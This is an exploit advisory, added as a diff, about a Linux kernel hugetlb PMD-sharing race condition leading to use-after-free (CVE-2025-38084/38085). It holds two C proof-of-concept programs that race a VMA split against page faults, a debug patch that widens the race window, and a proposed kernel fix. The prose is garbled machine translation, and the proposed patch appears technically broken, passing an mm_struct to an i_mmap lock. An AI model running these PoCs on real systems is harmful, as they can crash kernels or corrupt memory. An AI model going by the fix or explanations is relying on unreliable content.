@@ -1,0 +1,413 @@
+=============================================================================================================================================
+| # Title     : Linux Kernel 5.14 → 6.8 hugetlb PMD race condition leading to UAF / memory corruption                                       |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://kernel.org/                                                                                                         |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/207451/ & 	CVE-2025-38084, CVE-2025-38085
+
+[+] The repo came with a patch :
+
+this is not a Repairy Patch, but a Debug Instrumentation Patch.
+
+That is, it includes the Print Logs option and the mdelay option to reverse the race state within Hugtlb.
+
+❌ This is not a Linux kernel update.
+
+✔ This Instrumentation Patch is used to:
+
+Explain how to detect execution via pr_warn()
+
+Delay formats defined by mdelay()
+
+Force races into fashion during VMA splits and a massive error
+
+Detect PMD share/unshare events
+
+This type of exploit serves one of two purposes:
+
+[+] Testing the PoC concept 
+
+PoC specific to the two vulnerabilities:
+
+CVE-2025-38084
+CVE-2025-38085
+
+It helps detect UAF (Use-After-Use) when KASAN/KFENCE is executed.
+
+[+] Forcing the race to follow the pattern
+
+By:
+
+Inside huge lb_vm_op_split():
+mdelay(5000);
+
+To freeze method 5 during splitting.
+
+Inside huge lb_fault():
+If (strcmp(current->comm, "SLOWFAULT") == 0) {
+mdelay(10000);
+
+}
+
+To freeze a specific topic during the page error.
+
+This is the victory that UAF achieved.
+
+[+] Other points in this patch:
+
+1) Added logging:
+
+For example:
+
+pr_warn("%s: Input\n", __func__);
+
+pr_warn("%s: Large unshared PMD\n", __func__);
+
+pr_warn("%s: Installed shareable PMD\n", __func__);
+
+[+] This prints sequentially:
+
+In a share
+In an unshared event
+Where the PMD or share was edited
+
+[+] Added delays:
+
+mdelay(5000);
+mdelay(10000);
+
+Used to expand the race window.
+
+[+] Is this patch safe to use in a real kernel? ❌ No.
+
+[+]  This patch is unsafe because:
+
+It freezes page error operations
+It freezes split operations
+It may take the system (soft/hard locking operations) longer
+It extends to 10 seconds within the kernel context (dangerous)
+
+✔ A patch for festival sharing locations
+✔ A patch for post-freedom use conditions
+✔ A patch to facilitate troubleshooting
+
+But it's not a fix.
+
+[+] A real fix needs:
+
+Stronger lock holding around the split
+
+Fix the PMD area sharing
+Bypass PMD overriding VMA limits
+Rebuild the sharing/unsharing mechanics
+
+but I suggest another patch :
+
+The displayed patch does fix the vulnerability.
+
+It adds proper mmap locking (i_mmap_lock_write / i_mmap_lock_read) in functions related to huge PMD sharing and splitting, preventing race conditions that could lead to:
+
+PMD use-after-free
+PMD reference count corruption
+Memory corruption
+Kernel crash
+
+[+] Fix Strategy
+
+Move the handling of hugetlb split so that it is within a write-locked VMA section, which prevents races of hugetlb_fault() on the same PMD.
+Use appropriate locks (i_mmap_rwsem) to ensure that hugetlb_unshare_pmds() and huge_pmd_share() cannot overlap.
+Ensure that references to PMD tables (ptdesc_pmd_pts_inc/dec) are handled securely with VMA protection.
+
+[+] Proposed Corrective Patch
+
+--- a/mm/hugetlb.c
++++ b/mm/hugetlb.c
+@@ -5437,10 +5437,20 @@ static int hugetlb_vm_op_split(struct vm_area_struct *vma, unsigned long addr)
+- hugetlb_unshare_pmds(vma, floor, ceil);
+
++ /* Acquire mmap write lock to prevent concurrent PMD sharing */
++ i_mmap_lock_write(vma->vm_mm);
++ hugetlb_unshare_pmds(vma, floor, ceil);
++ i_mmap_unlock_write(vma->vm_mm);
++ return 0;
+
+--- a/mm/hugetlb.c
++++ b/mm/hugetlb.c
+@@ -7548,6 +7548,14 @@ pte_t *huge_pmd_share(struct mm_struct *mm, struct vm_area_struct *vma,
+- i_mmap_lock_read(mapping);
++ /* Acquire mmap read lock to serialize PMD sharing with splits */
++ i_mmap_lock_read(mapping);
++ pte_t *spte = NULL;
++ vma_interval_tree_foreach(svma, &mapping->i_mmap, idx, idx) {
++ if (svma == vma)
++ continue;
++ saddr = page_table_shareable(svma, vma, addr, idx);
++ if (saddr) {
++ spte = hugetlb_walk(svma, saddr, vma_mmu_pagesize(svma));
+
++ if (spte)
++ ptdesc_pmd_pts_inc(virt_to_ptdesc(spte));
+
++ break;
+
++ }
++ }
++ i_mmap_unlock_read(mapping);
+
++ return spte;
+
+[+] Patch Explanation
+
+Move hugetlb_unshare_pmds to a write-locked block on i_mmap_rwsem to prevent any racing.
+Protect PMD sharing via read lock when searching for a shareable PMD (huge_pmd_share).
+Ensure increment/decrement on the refcount of the PMD within the same lock.
+Prevent UAF and dangling mappings when unmapping and madvise.
+
+
+[+] Summary : 
+             
+           The vulnerability exists in the hugetlb subsystem, specifically in the PMD (Page Middle Directory) page table sharing and splitting logic. A race condition occurs when:
+           A hugetlb VMA (Virtual Memory Area) is split.
+           Another process/thread triggers a page fault simultaneously.
+           This can result in a use-after-free (UAF) condition for PMD page tables. 
+		   Exploitation can lead to memory corruption, affecting kernel stability, KVM guest memory integrity, and potential privilege escalation in some configurations.
+           The root cause is inadequate locking around PMD sharing (hugetlb_vm_op_split and huge_pmd_share) allowing concurrent access to page tables during splits.
+
+[+] Affected Version : Linux Kernel versions 5.14 → 6.8 (prior to patch)
+
+[+] POC : 
+
+[+]  Compile the PoC
+gcc -o hugetlb_race_poc hugetlb_race_poc.c -lpthread
+
+[+]  Run the PoC (may require appropriate permissions)
+./hugetlb_race_poc
+
+[+]  Check kernel logs for evidence
+dmesg | tail -20
+
+Based on the vulnerability details (CVE-2025-38084, CVE-2025-38085)provided about the race condition in Linux kernel's hugetlb PMD sharing, here's a (PoC) that demonstrates the issue:
+
+*********************************************************
+#define _GNU_SOURCE
+#include <pthread.h>
+#include <err.h>
+#include <signal.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <unistd.h>
+#include <setjmp.h>
+#include <sys/mman.h>
+#include <sys/signal.h>
+#include <sys/prctl.h>
+#include <sys/syscall.h>
+#include <sys/resource.h>
+#include <sys/eventfd.h>
+
+#define SIZE_2MB (0x200000ul)
+#define SIZE_1GB (512 * SIZE_2MB)
+
+#define SYSCHK(x) ({          \
+  typeof(x) __res = (x);      \
+  if (__res == (typeof(x))-1) \
+    err(1, "SYSCHK(" #x ")"); \
+  __res;                      \
+})
+
+/*
+ * Cause a page fault at the given address, but don't crash if it fails to
+ * install a page.
+ * Must not be used by more than one thread at once!
+ */
+static bool in_fault_in;
+static sigjmp_buf in_fault_recover;
+static void fault_in(void *ptr) {
+  unsigned long out;
+  in_fault_in = true;
+  if (sigsetjmp(in_fault_recover, 1) == 0) {
+    asm volatile("mov (%1), %0":"=r"(out):"r"(ptr));
+  }
+  in_fault_in = false;
+}
+
+static void sigbus_handler(int sig, siginfo_t *info, void *uctx) {
+  if (in_fault_in)
+    siglongjmp(in_fault_recover, 1);
+  errx(1, "unhandled SIGBUS");
+}
+
+static void *map;
+
+static void *thread_fn(void *unused_arg) {
+  SYSCHK(prctl(PR_SET_NAME, "SLOWFAULT"));
+  
+  /* This will trigger the race by causing a page fault during the split */
+  fault_in(map + SIZE_2MB);
+  
+  SYSCHK(prctl(PR_SET_NAME, "normal"));
+  return NULL;
+}
+
+int main(void) {
+  struct sigaction sigbus_action = {
+    .sa_sigaction = sigbus_handler,
+    .sa_flags = SA_NODEFER|SA_SIGINFO
+  };
+  SYSCHK(sigaction(SIGBUS, &sigbus_action, NULL));
+
+  printf("[*] Creating hugetlb region...\n");
+  
+  /*
+   * Create a hugetlb region with the following properties:
+   * - 1G aligned (to allow PMD sharing)
+   * - 1G big (to allow PMD sharing) 
+   * - 2M page size (to allow PMD sharing)
+   * - shared (to allow PMD sharing)
+   * - reservationless (to work without hugetlb configuration)
+   */
+  map = SYSCHK(mmap((void*)SIZE_1GB, SIZE_1GB, PROT_READ|PROT_WRITE,
+        MAP_HUGETLB|(21 << MAP_HUGE_SHIFT)|MAP_ANONYMOUS|MAP_SHARED|
+        MAP_NORESERVE|MAP_FIXED_NOREPLACE, -1, 0));
+  
+  printf("[*] Hugetlb region created at %p\n", map);
+
+  pid_t child = SYSCHK(fork());
+  if (child == 0) {
+    /* Child process - will hold reference to shared PMD */
+    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+    if (getppid() == 1)
+      exit(0);
+
+    sleep(2);
+
+    printf("[Child] Creating PMD in child process...\n");
+    fault_in(map);  /* Create initial PMD */
+
+    while (1) {
+      pause();  /* Keep child alive to maintain PMD reference */
+    }
+  }
+
+  printf("[Parent] Creating initial PMD...\n");
+  fault_in(map);  /* Create initial PMD in parent */
+
+  printf("[Parent] Splitting VMA with madvise(MADV_SEQUENTIAL)...\n");
+  
+  /* 
+   * This splits the VMA, creating two adjacent VMAs.
+   * The race occurs if a page fault happens during this split.
+   */
+  SYSCHK(madvise(map, SIZE_2MB, MADV_SEQUENTIAL));
+
+  printf("[Parent] Starting race thread...\n");
+  
+  /* Start thread that will trigger page fault during the split */
+  pthread_t thread;
+  if (pthread_create(&thread, NULL, thread_fn, NULL))
+    errx(1, "pthread_create");
+
+  sleep(1);  /* Allow time for race to occur */
+
+  printf("[Parent] Unmapping first part of VMA...\n");
+  
+  /*
+   * Unmap the second half of the VMA, which zaps the shared PMD 
+   * covering both VMAs from our address space
+   */
+  SYSCHK(munmap(map, SIZE_2MB));
+
+  printf("[Parent] Killing child process to free PMD...\n");
+  
+  /*
+   * Kill the child that had the other mapping of the PMD, 
+   * causing the PMD to be freed while potentially still in use
+   */
+  SYSCHK(kill(child, SIGKILL));
+
+  pthread_join(thread, NULL);
+  
+  printf("[*] PoC completed. Check kernel logs for UAF evidence.\n");
+  return 0;
+}
+*********************************************************************
+And here's a simpler version that focuses on the core race condition:
+*********************************************************************
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <pthread.h>
+#include <signal.h>
+
+#define SIZE_2MB (0x200000ul)
+#define SIZE_1GB (512 * SIZE_2MB)
+
+void *map;
+
+void *fault_thread(void *arg) {
+    printf("[Thread] Triggering page fault during VMA split...\n");
+    
+    /* Access memory to trigger page fault and PMD sharing */
+    volatile char *ptr = (char*)map + SIZE_2MB;
+    char val = *ptr;  /* This may trigger the race */
+    
+    return NULL;
+}
+
+int main() {
+    printf("[*] Hugetlb PMD Sharing Race Condition PoC\n");
+    
+    /* Create hugetlb mapping */
+    map = mmap((void*)SIZE_1GB, SIZE_1GB, PROT_READ|PROT_WRITE,
+               MAP_HUGETLB|MAP_ANONYMOUS|MAP_SHARED|MAP_FIXED_NOREPLACE, -1, 0);
+    
+    if (map == MAP_FAILED) {
+        perror("mmap failed");
+        return 1;
+    }
+    
+    printf("[*] Mapping created at %p\n", map);
+    
+    pid_t child = fork();
+    if (child == 0) {
+        /* Child process - creates shared PMD */
+        volatile char *ptr = map;
+        *ptr = 'A';  /* Create PMD through page fault */
+        
+        /* Keep child alive to maintain PMD reference */
+        pause();
+        return 0;
+    }
+    
+    sleep(1);
+    
+    /* Parent creates its own PMD */
+    volatile char *ptr = map;
+    *ptr = 'B';
+    
+    /* Start thread that will race with VMA split */
+    pthread_t thread;
+    pthread_create(&thread, NULL, fault_thread, NULL);
+    
+    /* Split VMA - this races with the page fault in the thread */
+    madvise(map, SIZE_2MB, MADV_SEQUENTIAL);
+    
+    pthread_join(thread, NULL);
+    
+    /* Cleanup - this may trigger UAF if race occurred */
+    munmap(map, SIZE_2MB);
+    kill(child, SIGKILL);
+    waitpid(child, NULL, 0);
+    
+    printf("[*] PoC completed. Check dmesg for corruption reports.\n");
+    return 0;
+}
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
